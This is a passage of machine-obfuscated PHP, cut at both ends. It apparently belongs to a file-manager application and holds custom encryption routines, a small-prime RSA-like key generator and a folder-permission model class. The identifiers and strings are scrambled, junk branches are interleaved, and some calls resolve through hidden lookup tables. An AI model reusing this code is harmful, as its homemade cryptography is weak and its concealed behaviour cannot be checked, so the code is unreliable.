$this->ukdc08c6e110($µÒêÎƒö, base64_encode($É½ñ’Ö¦ . $¨ßñ•ü—)); break; case $œ¨–í‘ñ[296]: $Î¿Õ¡ = $this->ukdc08c6e110($µÒêÎƒö, md5($É½ñ’Ö¦ . $¨ßñ•ü—)); $¹õïû = $ÇŠ³Õ§Ô[721]; if (!$¹õïû) { die; } break; $Š­“­¶ = $ÇŠ³Õ§Ô[722]; if (strlen($Š­“­¶) < $ÇŠ³Õ§Ô[683]) { die; } case $œ¨–í‘ñ[297]: $µÒêÎƒö = base64_encode($µÒêÎƒö); $Ñêƒß”é = rand(0, 64); $ÍŞÏçäì = $ÖùÉé‘÷[$Ñêƒß”é]; $™îóÆÈú = $ÇŠ³Õ§Ô[723]; $›ÒÓ¿á› = md5($ÍŞÏçäì . md5($¨ßñ•ü— . $ÍŞÏçäì) . $¨ßñ•ü—); $›ÒÓ¿á› = substr($›ÒÓ¿á›, $Ñêƒß”é % 8, $Ñêƒß”é % 8 + 7); $ÚùÏ¤¡½ = $œ¨–í‘ñ[6]; $ÎÒü¾™ = 0; $ğŒ’Û·Á = 0; $ü¶ÔÁòù = $ÇŠ³Õ§Ô[724]; if (!$ü¶ÔÁòù) { die; } $ï¬ı°½Ñ = 0; for ($ÎÒü¾™ = 0; $ÎÒü¾™ < strlen($µÒêÎƒö); $ÎÒü¾™++) { $ï¬ı°½Ñ = $ï¬ı°½Ñ == strlen($›ÒÓ¿á›) ? 0 : $ï¬ı°½Ñ; $ğŒ’Û·Á = ($Ñêƒß”é + strpos($ÖùÉé‘÷, $µÒêÎƒö[$ÎÒü¾™]) + ord($›ÒÓ¿á›[$ï¬ı°½Ñ++])) % 64; $Œ•èÇ¬± = $ÇŠ³Õ§Ô[725]; while (strlen($Œ•èÇ¬±) < $ÇŠ³Õ§Ô[659]) { if (!$Œ•èÇ¬±) { break; } $Œ•èÇ¬±++; } $ÚùÏ¤¡½ .= $ÖùÉé‘÷[$ğŒ’Û·Á]; } $Î¿Õ¡ = hash_encode($ÍŞÏçäì . $ÚùÏ¤¡½); $‘¸î™³™ = $ÇŠ³Õ§Ô[726]; if (strlen($‘¸î™³™) < $ÇŠ³Õ§Ô[663]) { return; } break; $¹½¾÷¼° = $ÇŠ³Õ§Ô[727]; if (strlen($¹½¾÷¼°) < $ÇŠ³Õ§Ô[656]) { return; } default: $Î¿Õ¡ = $this->ukdc08c6e110($µÒêÎƒö, $¨ßñ•ü— . $É½ñ’Ö¦); $«ÎÕ¦ò = $ÇŠ³Õ§Ô[728]; break; $Ìå“Î™  = $ÇŠ³Õ§Ô[729]; while ($Ìå“Î™  < $ÇŠ³Õ§Ô[683]) { if ($Ìå“Î™  >= 0) { break; } $Ìå“Î™ ++; } } $Î¿Õ¡ = strrev($™¶ÅÇ¤ì . $É½ñ’Ö¦ . $Î¿Õ¡); if ($ÚëŸğÊ¢ - 1 > 0) { $Î¿Õ¡ = $this->zdlif213eb5f($Î¿Õ¡, $¨ßñ•ü—, $ÚëŸğÊ¢ - 1); } return $Î¿Õ¡; } private function sytd9dfb75d8($—Ú¨Œ˜, $®ó½Ë£, $Õ¤›°â = 3) { $ø–‚‘­ =& $_SERVER[™»È’øè]; $ˆ¦ï¢Íü =& $_SERVER[ÏÉ‹Ã ]; if (!is_string($—Ú¨Œ˜) || strlen($—Ú¨Œ˜) < 10) { return !1; } $—Ú¨Œ˜ = trim($—Ú¨Œ˜); $êœĞ¡ß³ = $ø–‚‘­[730]; $—Ú¨Œ˜ = strrev($—Ú¨Œ˜); $…£äØé± = $—Ú¨Œ˜[0]; $ıŞ‰€‡ó = $ø–‚‘­[731]; if (strlen($ıŞ‰€‡ó) < $ø–‚‘­[654]) { return; } $…°‚¬‰İ = substr($—Ú¨Œ˜, 1, 15); $‚×‘çÊ˜ = $ø–‚‘­[732]; while ($‚×‘çÊ˜ < $ø–‚‘­[659]) { if ($‚×‘çÊ˜ >= 0) { break; } $‚×‘çÊ˜++; } $—Ú¨Œ˜ = substr($—Ú¨Œ˜, 16); $¾îóÎ–ô = $ˆ¦ï¢Íü[294]; switch ($…£äØé±) { case $ˆ¦ï¢Íü[203]: $”¼Ä¶ùé = $this->zoqb407bcba5($—Ú¨Œ˜, strrev($®ó½Ë£ . $…°‚¬‰İ)); $ô¦Õ»°Œ = $ø–‚‘­[733]; while ($ô¦Õ»°Œ < $ø–‚‘­[656]) { if ($ô¦Õ»°Œ >= 0) { break; } $ô¦Õ»°Œ++; } break; case $ˆ¦ï¢Íü[121]: $”¼Ä¶ùé = $this->zoqb407bcba5($—Ú¨Œ˜, strrev($…°‚¬‰İ . $®ó½Ë£)); break; case $ˆ¦ï¢Íü[295]: $”¼Ä¶ùé = $this->zoqb407bcba5($—Ú¨Œ˜, base64_encode($…°‚¬‰İ . $®ó½Ë£)); break; $Ğ¶çÚÜ = $ø–‚‘­[734]; while ($Ğ¶çÚÜ < $ø–‚‘­[656]) { if ($Ğ¶çÚÜ >= 0) { break; } $Ğ¶çÚÜ++; } case $ˆ¦ï¢Íü[296]: $”¼Ä¶ùé = $this->zoqb407bcba5($—Ú¨Œ˜, md5($…°‚¬‰İ . $®ó½Ë£)); break; $´Öõà˜– = $ø–‚‘­[735]; while (strlen($´Öõà˜–) < $ø–‚‘­[654]) { if (!$´Öõà˜–) { break; } $´Öõà˜–++; } case $ˆ¦ï¢Íü[297]: $—Ú¨Œ˜ = hash_decode($—Ú¨Œ˜); $„’ÎâŒÛ = $ø–‚‘­[736]; if (!$„’ÎâŒÛ) { die; } $«™‡ø”Á = $—Ú¨Œ˜[0]; $—Ú¨Œ˜ = substr($—Ú¨Œ˜, 1); $‹î€ãÓä = strpos($¾îóÎ–ô, $«™‡ø”Á); $«’•é‘ = $ø–‚‘­[737]; while (strlen($«’•é‘) < $ø–‚‘­[659]) { if (!$«’•é‘) { break; } $«’•é‘++; } $¤•€¾îò = md5($«™‡ø”Á . md5($®ó½Ë£ . $«™‡ø”Á) . $®ó½Ë£); $•¦Ÿèè» = $ø–‚‘­[738]; while (strlen($•¦Ÿèè») < $ø–‚‘­[683]) { if (!$•¦Ÿèè») { break; } $•¦Ÿèè»++; } $¤•€¾îò = substr($¤•€¾îò, $‹î€ãÓä % 8, $‹î€ãÓä % 8 + 7); $ãœºğ¹ = $ø–‚‘­[739]; if (!$ãœºğ¹) { return; } $«üáåÈ = $ˆ¦ï¢Íü[6]; $±Öò£çã = $ø–‚‘­[740]; $ç¦·ÁŸ• = 0; $¸’ğ†ºû = 0; $†„¾®Õ = $ø–‚‘­[741]; while (strlen($†„¾®Õ) < $ø–‚‘­[654]) { if (!$†„¾®Õ) { break; } $†„¾®Õ++; } $Ãœ¼¨¢ = 0; for ($ç¦·ÁŸ• = 0; $ç¦·ÁŸ• < strlen($—Ú¨Œ˜); $ç¦·ÁŸ•++) { $Ãœ¼¨¢ = $Ãœ¼¨¢ == strlen($¤•€¾îò) ? 0 : $Ãœ¼¨¢; $´¸¾¹êş = $ø–‚‘­[742]; while ($´¸¾¹êş < $ø–‚‘­[654]) { if ($´¸¾¹êş >= 0) { break; } $´¸¾¹êş++; } $ÍöôÀ× = $Ãœ¼¨¢++; $öÜ£÷§ü = $ø–‚‘­[743]; if (strlen($öÜ£÷§ü) < $ø–‚‘­[683]) { die; } $¸’ğ†ºû = strpos($¾îóÎ–ô, $—Ú¨Œ˜[$ç¦·ÁŸ•]) - $‹î€ãÓä - ord($¤•€¾îò[$ÍöôÀ×]); while ($¸’ğ†ºû < 0) { $¸’ğ†ºû += 64; $°àÛ€º = $ø–‚‘­[744]; if (strlen($°àÛ€º) < $ø–‚‘­[683]) { return; } } $«üáåÈ .= $¾îóÎ–ô[$¸’ğ†ºû]; $«—ƒÇ”© = $ø–‚‘­[745]; if (strlen($«—ƒÇ”©) < $ø–‚‘­[683]) { die; } } $”¼Ä¶ùé = base64_decode($«üáåÈ); $¾îÜèëŠ = $ø–‚‘­[746]; while (strlen($¾îÜèëŠ) < $ø–‚‘­[654]) { if (!$¾îÜèëŠ) { break; } $¾îÜèëŠ++; } break; default: $”¼Ä¶ùé = $this->zoqb407bcba5($—Ú¨Œ˜, $®ó½Ë£ . $…°‚¬‰İ); break; } if ($Õ¤›°â - 1 > 0) { $”¼Ä¶ùé = $this->sytd9dfb75d8($”¼Ä¶ùé, $®ó½Ë£, $Õ¤›°â - 1); } return $”¼Ä¶ùé; } public function ecinba9bdad3($‰‚­¯†) { $­—¸ú‡Á =& $_SERVER[™»È’øè]; $­ ¬ƒ´ =& $_SERVER[ÏÉ‹Ã ]; $¬Õ¿¿şú = $this->xrdv982f9353(); $­öµÔàæ = $­—¸ú‡Á[747]; $÷ò•Ş‹× = $this->xrdv982f9353(); $ƒ°Ã†Á× = ($¬Õ¿¿şú - 1) * ($÷ò•Ş‹× - 1); $µÇì¨Ñ¯ = intval(($¬Õ¿¿şú + $÷ò•Ş‹×) / 2); $¡Îá§©Ğ = $­—¸ú‡Á[748]; if (strlen($¡Îá§©Ğ) < $­—¸ú‡Á[663]) { die; } while (1) { $¡¾²¯Éå = $µÇì¨Ñ¯; $†Äãö‚ = $ƒ°Ã†Á×; while ($†Äãö‚ % $¡¾²¯Éå != 0) { $õÍªÈ“Í = $†Äãö‚; $†Äãö‚ = $¡¾²¯Éå; $ÎóµÉˆé = $­—¸ú‡Á[749]; $¡¾²¯Éå = $õÍªÈ“Í % $¡¾²¯Éå; } if ($¡¾²¯Éå == 1) { break; } else { $µÇì¨Ñ¯++; } } $Ÿ¼Ø‰±Æ = 2; for ($íšĞÔÊû = 0; $íšĞÔÊû < $ƒ°Ã†Á× * 10; $íšĞÔÊû++) { if (($ƒ°Ã†Á× * $íšĞÔÊû + 1) % $µÇì¨Ñ¯ == 0) { $Ÿ¼Ø‰±Æ = intval(($ƒ°Ã†Á× * $íšĞÔÊû + 1) / $µÇì¨Ñ¯); break; } } $–ÎÁóÃŒ = $this->ukdc08c6e110($¬Õ¿¿şú * $÷ò•Ş‹× . $­ ¬ƒ´[6], $­ ¬ƒ´[135]); $–¬ş¾ı¢ = md5($­ ¬ƒ´[298] . ($¬Õ¿¿şú + $÷ò•Ş‹×) . $­ ¬ƒ´[299] . $µÇì¨Ñ¯ . $­ ¬ƒ´[299] . $Ÿ¼Ø‰±Æ . $­ ¬ƒ´[300]); $é€À¡§· = $­—¸ú‡Á[750]; if (strlen($é€À¡§·) < $­—¸ú‡Á[659]) { return; } $Åî²îº¯ = $this->ukdc08c6e110($‰‚­¯†, $–¬ş¾ı¢) . $­ ¬ƒ´[301] . $–ÎÁóÃŒ; $ Ğ÷şÈ– = $­—¸ú‡Á[751]; while (strlen($ Ğ÷şÈ–) < $­—¸ú‡Á[683]) { if (!$ Ğ÷şÈ–) { break; } $ Ğ÷şÈ–++; } return $Åî²îº¯; $ÉÎğÔ¢ = $­—¸ú‡Á[752]; if (!$ÉÎğÔ¢) { return; } } public function kcjz3810e83e($«³Îèé‘) { $‘î®’¿ˆ =& $_SERVER[™»È’øè]; $¼ç¸Ú¨ =& $_SERVER[ÏÉ‹Ã ]; $ÆãŸöœß = explode($¼ç¸Ú¨[301], $«³Îèé‘); if (count($ÆãŸöœß) != 2) { return $¼ç¸Ú¨[6]; } $Ä€ÖÃ§ú = $this->zoqb407bcba5($ÆãŸöœß[1] . $¼ç¸Ú¨[6], $¼ç¸Ú¨[135]); $í·ã¢Ø½ = $‘î®’¿ˆ[753]; if (strlen($í·ã¢Ø½) < $‘î®’¿ˆ[656]) { die; } if (!$Ä€ÖÃ§ú) { return $¼ç¸Ú¨[6]; } $Ä€ÖÃ§ú = intval($Ä€ÖÃ§ú); $ĞßóÖîã = $‘î®’¿ˆ[754]; if (!$ĞßóÖîã) { die; } $©àå¯÷¤ = 0; $ä³ºŠ²Ì = $‘î®’¿ˆ[755]; if (strlen($ä³ºŠ²Ì) < $‘î®’¿ˆ[656]) { die; } $ÅŒ¶ï˜¿ = 0; $·Èˆ‰½Ÿ = $‘î®’¿ˆ[756]; for ($Ñæ—¦¥ = 3; $Ñæ—¦¥ < $Ä€ÖÃ§ú; $Ñæ—¦¥ += 2) { if ($Ä€ÖÃ§ú % $Ñæ—¦¥ != 0) { continue; } $©àå¯÷¤ = $Ñæ—¦¥; $ç©êÀ·Ÿ = $‘î®’¿ˆ[757]; if (strlen($ç©êÀ·Ÿ) < $‘î®’¿ˆ[656]) { return; } $ÅŒ¶ï˜¿ = intval($Ä€ÖÃ§ú / $Ñæ—¦¥); break; $ëÚ¾êï = $‘î®’¿ˆ[758]; if (!$ëÚ¾êï) { die; } } $‚ÃñÓ§ = ($©àå¯÷¤ - 1) * ($ÅŒ¶ï˜¿ - 1); $§¤¶„Ùí = $‘î®’¿ˆ[759]; if (strlen($§¤¶„Ùí) < $‘î®’¿ˆ[683]) { die; } $ıÂ™·ì· = intval(($©àå¯÷¤ + $ÅŒ¶ï˜¿) / 2); $ÂÇáƒÊ™ = $‘î®’¿ˆ[760]; while (strlen($ÂÇáƒÊ™) < $‘î®’¿ˆ[683]) { if (!$ÂÇáƒÊ™) { break; } $ÂÇáƒÊ™++; } while (1) { $šÂÌä»ô = $ıÂ™·ì·; $Á»‰²¤Ô = $‚ÃñÓ§; $¥¸¤Ó¬‚ = $‘î®’¿ˆ[761]; while ($Á»‰²¤Ô % $šÂÌä»ô != 0) { $ù¢˜™üÜ = $Á»‰²¤Ô; $éá‘˜Ø× = $‘î®’¿ˆ[762]; $Á»‰²¤Ô = $šÂÌä»ô; $šÂÌä»ô = $ù¢˜™üÜ % $šÂÌä»ô; $¸åá¿õ” = $‘î®’¿ˆ[763]; if (!$¸åá¿õ”) { die; } } if ($šÂÌä»ô == 1) { break; } else { $ıÂ™·ì·++; } } $Şê’–Øø = 2; for ($Ñæ—¦¥ = 0; $Ñæ—¦¥ < $‚ÃñÓ§ * 10; $Ñæ—¦¥++) { if (($‚ÃñÓ§ * $Ñæ—¦¥ + 1) % $ıÂ™·ì· == 0) { $Şê’–Øø = intval(($‚ÃñÓ§ * $Ñæ—¦¥ + 1) / $ıÂ™·ì·); break; } } $ßÎèˆøğ = md5($¼ç¸Ú¨[298] . ($©àå¯÷¤ + $ÅŒ¶ï˜¿) . $¼ç¸Ú¨[299] . $ıÂ™·ì· . $¼ç¸Ú¨[299] . $Şê’–Øø . $¼ç¸Ú¨[300]); $¼·Ì µÕ = $‘î®’¿ˆ[764]; while (strlen($¼·Ì µÕ) < $‘î®’¿ˆ[663]) { if (!$¼·Ì µÕ) { break; } $¼·Ì µÕ++; } $¸™Á½Á˜ = $this->zoqb407bcba5($ÆãŸöœß[0], $ßÎèˆøğ); $“çœ‹¬œ = $‘î®’¿ˆ[765]; return $¸™Á½Á˜; $àòäî¢¯ = $‘î®’¿ˆ[766]; } public function xrdv982f9353() { $æ¥·°£” =& $_SERVER[™»È’øè]; $¸ ¾ıÌ¿ = mt_rand(pow(2, 14), pow(2, 16) - 1); $‰—»‹•¿ = array(); $ìÄ¤¨ï§ = 1; while ($ìÄ¤¨ï§ <= (int) sqrt($¸ ¾ıÌ¿)) { $Óá…í×à = $ìÄ¤¨ï§; $ï…êÍ³á = $æ¥·°£”[767]; if (strlen($ï…êÍ³á) < $æ¥·°£”[654]) { die; } while (!0) { $Óá…í×à++; if ($Óá…í×à <= 2) { $ìÄ¤¨ï§ = $Óá…í×à; break; } else { if ($Óá…í×à < 2) { continue; } } $Œ¼½Å‘Õ = !0; for ($‹«ô± = 2; $‹«ô± <= sqrt($Óá…í×à); $‹«ô±++) { if ($Óá…í×à % $‹«ô± == 0) { $Œ¼½Å‘Õ = !1; } } if ($Œ¼½Å‘Õ) { $ìÄ¤¨ï§ = $Óá…í×à; break; } } $‰—»‹•¿[] = $ìÄ¤¨ï§; $¤©’óı = $æ¥·°£”[768]; if (strlen($¤©’óı) < $æ¥·°£”[659]) { die; } } $Úàõë¨Í = 2; for ($Óá…í×à = $¸ ¾ıÌ¿; $Óá…í×à > 1; $Óá…í×à--) { $Œ¼½Å‘Õ = !0; $‚ğİçİğ = $æ¥·°£”[769]; if (strlen($‚ğİçİğ) < $æ¥·°£”[656]) { return; } foreach ($‰—»‹•¿ as $èëÌİÑ´) { if ($Óá…í×à % $èëÌİÑ´ == 0) { $Œ¼½Å‘Õ = !1; break; } } if ($Œ¼½Å‘Õ) { $Úàõë¨Í = $Óá…í×à; break; } } return $Úàõë¨Í; $’ÔòÕŒ° = $æ¥·°£”[770]; if (strlen($’ÔòÕŒ°) < $æ¥·°£”[654]) { die; } } public function okcef17be96d($é„şùî«, $ø”ßĞà) { $±‘ÄÙ± =& $_SERVER[ÏÉ‹Ã ]; return call_user_func(array($±‘ÄÙ±[8], $±‘ÄÙ±[302]), $é„şùî«, $ø”ßĞà); } public function ukdc08c6e110($‰³Ø‹¹–, $§—Ìåµ‹) { $×İ€ÊîÂ =& $_SERVER[™»È’øè]; $±Ïİóæ =& $_SERVER[ÏÉ‹Ã ]; return call_user_func(array($±Ïİóæ[303], $±Ïİóæ[304]), $‰³Ø‹¹–, $§—Ìåµ‹); $ä –›å› = $×İ€ÊîÂ[771]; while (strlen($ä –›å›) < $×İ€ÊîÂ[656]) { if (!$ä –›å›) { break; } $ä –›å›++; } } public function zoqb407bcba5($Ï¯­Ò‚, $„©‰ú‚É) { $È„…Ï­ =& $_SERVER[ÏÉ‹Ã ]; return call_user_func(array($È„…Ï­[303], $È„…Ï­[305]), $Ï¯­Ò‚, $„©‰ú‚É); $˜í’Š = $_SERVER[™»È’øè][772]; if (!$˜í’Š) { return; } } } goto Få‰ÄÑğ¤î; BéêôÆ¹÷: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\x63\145\137\141\165\x74\x68"; public function getAuth($›à ÓÈÁ) { $Àòê¡ =& $_SERVER[™»È’øè]; $à¿º“¨ñ = $this->sourceAuthSelect($›à ÓÈÁ); $½é«®şæ = array(); $¦²•ˆ¼Ò = array(); $¥ÙÅõôã = 2 << 25; foreach ($à¿º“¨ñ as $‡ÈñßÑ¦) { $·—ãòòğ = Model($Àòê¡[539])->listData($‡ÈñßÑ¦[$Àòê¡[1974]]); if (!$·—ãòòğ) { continue; } $½é«®şæ[] = $‡ÈñßÑ¦; $ö¥¼ïä  = 0; if ($‡ÈñßÑ¦[$Àòê¡[177]] == SourceModel::TYPE_GROUP) { $ö¥¼ïä  = $¥ÙÅõôã * 2; } if ($‡ÈñßÑ¦[$Àòê¡[177]] == SourceModel::TYPE_USER) { $ö¥¼ïä  = $¥ÙÅõôã; } if ($‡ÈñßÑ¦[$Àòê¡[177]] == SourceModel::TYPE_USER && $‡ÈñßÑ¦[$Àòê¡[537]] == $Àòê¡[211]) { $ö¥¼ïä  = 0; } $¦²•ˆ¼Ò[] = $·—ãòòğ[$Àòê¡[454]] + $ö¥¼ïä ; } array_multisort($¦²•ˆ¼Ò, SORT_DESC, $½é«®şæ); return $½é«®şæ; } public function sourceAuthSelect($ş›ËÏÊË) { $ŸÈ­À¿Æ =& $_SERVER[™»È’øè]; static $ˆìĞ¯è¦ = array(); $øÈ´¾à = is_array($ş›ËÏÊË) ? !1 : !0; if ($øÈ´¾à) { $ş›ËÏÊË = array($ş›ËÏÊË); } $è¶ÕòÁú = array(); foreach ($ş›ËÏÊË as $ßÙ ğíµ) { if (isset($ˆìĞ¯è¦[$ßÙ ğíµ])) { $è¶ÕòÁú[$ßÙ ğíµ] = $ˆìĞ¯è¦[$ßÙ ğíµ]; } } if (count($è¶ÕòÁú) == count($ş›ËÏÊË)) { return $øÈ´¾à ? $è¶ÕòÁú[$ş›ËÏÊË[0]] : $è¶ÕòÁú; } $†Û‡ŒÂ¯ = $ŸÈ­À¿Æ[2051]; $şÙÃ¯Š… = array($ŸÈ­À¿Æ[180] => array($ŸÈ­À¿Æ[7], $ş›ËÏÊË)); $Ã€£´•Ğ = $this->field($†Û‡ŒÂ¯)->order($ŸÈ­À¿Æ[442])->where($şÙÃ¯Š…)->select(); $ÆÜÀÉ­ş = array_to_keyvalue_group($Ã€£´•Ğ, $ŸÈ­À¿Æ[180]); foreach ($ş›ËÏÊË as $ßÙ ğíµ) { $ˆìĞ¯è¦[$ßÙ ğíµ] = $ÆÜÀÉ­ş[$ßÙ ğíµ] ? $ÆÜÀÉ­ş[$ßÙ ğíµ] : array(); } if ($øÈ´¾à) { return $Ã€£´•Ğ; } return $ÆÜÀÉ­ş; } public function setAuth($·Ş¢€â, $¼Ëß¹”¾) { $èÇš«‡Ì =& $_SERVER[™»È’øè]; $š¨²Î¸ = Model($èÇš«‡Ì[1362])->sourceInfo($·Ş¢€â); if (!$š¨²Î¸) { return !1; } if ($š¨²Î¸[$èÇš«‡Ì[177]] != SourceModel::TYPE_GROUP) { return !1; } $ÜË”Ç‚ú = 1; $µŒÖáÍ = $š¨²Î¸[$èÇš«‡Ì[537]]; if ($µŒÖáÍ != $ÜË”Ç‚ú) { $ù¥¯Œ¦ƒ = array($èÇš«‡Ì[1870] => $µŒÖáÍ); $îŸÕßŸÜ = Model($èÇš«‡Ì[1960])->field($èÇš«‡Ì[1678])->where($ù¥¯Œ¦ƒ)->select(); $îŸÕßŸÜ = array_to_keyvalue($îŸÕßŸÜ, $èÇš«‡Ì[12], $èÇš«‡Ì[1678]); } $„ÕùĞß³ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ò¤îÄïŒ = array(); foreach ($¼Ëß¹”¾ as $Àşò•Ç¢) { if (!in_array($Àşò•Ç¢[$èÇš«‡Ì[177]], $„ÕùĞß³)) { show_json(LNG($èÇš«‡Ì[2052]), !1); } if ($µŒÖáÍ != $ÜË”Ç‚ú) { if ($Àşò•Ç¢[$èÇš«‡Ì[177]] == SourceModel::TYPE_GROUP) { } if ($Àşò•Ç¢[$èÇš«‡Ì[537]] != 0 && !in_array($Àşò•Ç¢[$èÇš«‡Ì[537]], $îŸÕßŸÜ)) { } } if ($Àşò•Ç¢[$èÇš«‡Ì[537]] == 0) { $Àşò•Ç¢[$èÇš«‡Ì[177]] = SourceModel::TYPE_USER; } $ò¤îÄïŒ[] = array($èÇš«‡Ì[180] => $·Ş¢€â, $èÇš«‡Ì[177] => intval($Àşò•Ç¢[$èÇš«‡Ì[177]]), $èÇš«‡Ì[537] => intval($Àşò•Ç¢[$èÇš«‡Ì[537]]), $èÇš«‡Ì[1974] => intval($Àşò•Ç¢[$èÇš«‡Ì[1974]]) ? intval($Àşò•Ç¢[$èÇš«‡Ì[1974]]) : 0, $èÇš«‡Ì[2034] => intval($Àşò•Ç¢[$èÇš«‡Ì[2034]]) ? intval($Àşò•Ç¢[$èÇš«‡Ì[2034]]) : -1); } $this->where(array($èÇš«‡Ì[458] => $·Ş¢€â))->delete(); $this->addAll($ò¤îÄïŒ); return !0; } public function authClear($²ıæ«Ìæ) { $­«¼¬‹Å =& $_SERVER[™»È’øè]; $…ÏÁãëÛ = Model($­«¼¬‹Å[1362])->sourceInfo($²ıæ«Ìæ); $İÀ½×¶  = array($²ıæ«Ìæ); if ($…ÏÁãëÛ[$­«¼¬‹Å[452]] == $­«¼¬‹Å[88]) { $¿×¨öÌ = array($­«¼¬‹Å[619] => array($­«¼¬‹Å[579], $…ÏÁãëÛ[$­«¼¬‹Å[552]] . $²ıæ«Ìæ . $­«¼¬‹Å[580])); $İÀ½×¶  = Model($­«¼¬‹Å[1362])->field($­«¼¬‹Å[458])->where($¿×¨öÌ)->getField($­«¼¬‹Å[180], !0); $İÀ½×¶ [] = $²ıæ«Ìæ; } $this->where(array($­«¼¬‹Å[458] => array($­«¼¬‹Å[459], $İÀ½×¶ )))->delete(); return !0; } public function getAllChildren($¸ÊŒ„Œ…) { $°ÆºêŞ =& $_SERVER[™»È’øè]; $ü„şé­ = Model($°ÆºêŞ[1362])->sourceInfo($¸ÊŒ„Œ…); if ($ü„şé­[$°ÆºêŞ[452]] != $°ÆºêŞ[88]) { return $this->sourceListAuth(array($¸ÊŒ„Œ…)); } if ($ü„şé­[$°ÆºêŞ[177]] != SourceModel::TYPE_GROUP) { return array(); } $¦ç¦İƒ = 1; $Ş¶À’Ëé = array($¸ÊŒ„Œ…); if ($ü„şé­[$°ÆºêŞ[179]] == $°ÆºêŞ[211] && $ü„şé­[$°ÆºêŞ[537]] != $¦ç¦İƒ) { $Ş¶À’Ëé = $this->groupChidldAllRootSource($ü„şé­[$°ÆºêŞ[537]]); } $—¿¯ŸÈ = $this->field($°ÆºêŞ[180])->group($°ÆºêŞ[180])->select(); $—¿¯ŸÈ = array_to_keyvalue($—¿¯ŸÈ, $°ÆºêŞ[12], $°ÆºêŞ[180]); if (!$—¿¯ŸÈ) { return array(); } $¸›‹¹¸š = $°ÆºêŞ[2053]; $å¾®ş‰ = array($°ÆºêŞ[180] => array($°ÆºêŞ[7], $—¿¯ŸÈ), $°ÆºêŞ[472] => $°ÆºêŞ[211]); $ÙˆïòÉ = Model($°ÆºêŞ[850])->field($¸›‹¹¸š)->where($å¾®ş‰)->select(); $äùºÓ½¥ = array($¸ÊŒ„Œ…); foreach ($ÙˆïòÉ as $‡†áÁ¢’) { foreach ($Ş¶À’Ëé as $‡ÑŠóÕ ) { $´Á…ñ€Í = $°ÆºêŞ[50] . $‡ÑŠóÕ  . $°ÆºêŞ[50]; $ÇÖêÀß÷ = $‡†áÁ¢’[$°ÆºêŞ[552]] . $‡†áÁ¢’[$°ÆºêŞ[180]] . $°ÆºêŞ[50]; if (strstr($ÇÖêÀß÷, $´Á…ñ€Í)) { $äùºÓ½¥[] = $‡†áÁ¢’[$°ÆºêŞ[180]]; break; } } } return $this->sourceListAuth($äùºÓ½¥); } private function sourceListAuth($×ÎÇŸ‡É) { $ìûÈ° =& $_SERVER[™»È’øè]; $ƒ˜‹Ú™ˆ = Model($ìûÈ°[1362])->sourceListInfo($×ÎÇŸ‡É, !0); $ƒãÅüê = $this->sourceAuthSelect($×ÎÇŸ‡É); $ºœÉÑ¦î = array(); $Æ™Ê¸• = array(); foreach ($ƒ˜‹Ú™ˆ as $ÈÚóÓ¾) { unset($ÈÚóÓ¾[$ìûÈ°[496]]); unset($ÈÚóÓ¾[$ìûÈ°[494]]); unset($ÈÚóÓ¾[$ìûÈ°[454]]); unset($ÈÚóÓ¾[$ìûÈ°[87]]); $®…°÷÷Ä = $ƒãÅüê[$ÈÚóÓ¾[$ìûÈ°[180]]]; if (!$®…°÷÷Ä) { continue; } $ÈÚóÓ¾[$ìûÈ°[2054]] = $this->authTargetInfo($®…°÷÷Ä); $ÈÚóÓ¾[$ìûÈ°[550]] = rtrim($ÈÚóÓ¾[$ìûÈ°[556]], $ìûÈ°[8]) . $ìûÈ°[8] . ltrim($ÈÚóÓ¾[$ìûÈ°[550]], $ìûÈ°[8]); $ºœÉÑ¦î[] = $ÈÚóÓ¾; $Ò¼Ü€ß² = count(explode($ìûÈ°[8], trim($ÈÚóÓ¾[$ìûÈ°[550]], $ìûÈ°[8]))); $Æ™Ê¸•[] = $Ò¼Ü€ß² + ($ÈÚóÓ¾[$ìûÈ°[33]] == $ìûÈ°[75] ? 0 : 1000); } array_multisort($Æ™Ê¸•, SORT_ASC, $ºœÉÑ¦î); return $ºœÉÑ¦î; } private function groupChidldAllRootSource($Š‡Ÿõ‚) { $ö•Ñç´« =& $_SERVER[™»È’øè]; $õÒïÑ­‰ = Model($ö•Ñç´«[2055])->groupChildrenAll($Š‡Ÿõ‚); $¯¯ºìÚ = array($ö•Ñç´«[179] => 0, $ö•Ñç´«[537] => array($ö•Ñç´«[7], $õÒïÑ­‰), $ö•Ñç´«[177] => SourceModel::TYPE_GROUP); $€“ÏÚ¿ı = Model($ö•Ñç´«[850])->field($ö•Ñç´«[180])->where($¯¯ºìÚ)->select(); $€“ÏÚ¿ı = array_to_keyvalue($€“ÏÚ¿ı, $ö•Ñç´«[12], $ö•Ñç´«[180]); return $€“ÏÚ¿ı; } private function authTargetInfo($™¾ò£Û) { $Œ™ïÃ =& $_SERVER[™»È’øè]; $×üÇé€í = array(); $…œéÅ¥İ = array(); $ìà˜Éæø = 2 << 25; foreach ($™¾ò£Û as $íŠüİØî) { $ “÷ê±İ = Model($Œ™ïÃ[539])->listData($íŠüİØî[$Œ™ïÃ[1974]]); if (!$ “÷ê±İ) { continue; } if ($íŠüİØî[$Œ™ïÃ[177]] == SourceModel::TYPE_USER) { $ èáñ = Model($Œ™ïÃ[545])->getInfoSimpleOuter($íŠüİØî[$Œ™ïÃ[537]]); if ($ èáñ[$Œ™ïÃ[1678]] == $Œ™ïÃ[1218]) { continue; } if ($ èáñ[$Œ™ïÃ[1678]] == $Œ™ïÃ[211]) { $ èáñ[$Œ™ïÃ[32]] = LNG($Œ™ïÃ[2056]); } } else { $ èáñ = Model($Œ™ïÃ[553])->getInfoSimple($íŠüİØî[$Œ™ïÃ[537]]); } if (!$ èáñ) { continue; } $ èáñ[$Œ™ïÃ[507]] = $ “÷ê±İ; $×üÇé€í[] = $ èáñ; $–ôî€Öª = 0; if ($íŠüİØî[$Œ™ïÃ[177]] == SourceModel::TYPE_GROUP) { $–ôî€Öª = $ìà˜Éæø * 2; } if ($íŠüİØî[$Œ™ïÃ[177]] == SourceModel::TYPE_USER) { $–ôî€Öª = $ìà˜Éæø; } if ($íŠüİØî[$Œ™ïÃ[177]] == SourceModel::TYPE_USER && $íŠüİØî[$Œ™ïÃ[537]] == $Œ™ïÃ[211]) { $–ôî€Öª = 0; } $…œéÅ¥İ[] = $ “÷ê±İ[$Œ™ïÃ[454]] + $–ôî€Öª; } array_multisort($…œéÅ¥İ, SORT_DESC, $×üÇé€í); return $×üÇé€í; } public function getAllChildrenByUser($ò¶–±¸Î, $Ù€´…ÛÓ) { $õÅï‚„Ì =& 